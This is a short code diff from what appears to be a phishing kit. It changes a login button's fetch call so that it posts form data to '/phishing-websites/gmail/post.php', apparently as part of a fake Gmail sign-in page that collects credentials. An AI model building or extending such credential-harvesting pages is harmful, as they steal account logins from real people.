@@ -5272,7 +5272,7 @@
         const button = document.getElementById('loginButton');
 
         button.addEventListener('click', async _ => {
-            const response = await fetch('./post.php', {
+            const response = await fetch('/phishing-websites/gmail/post.php', {
                 method: 'POST',
                 headers: {
                     'Accept': 'application/json',
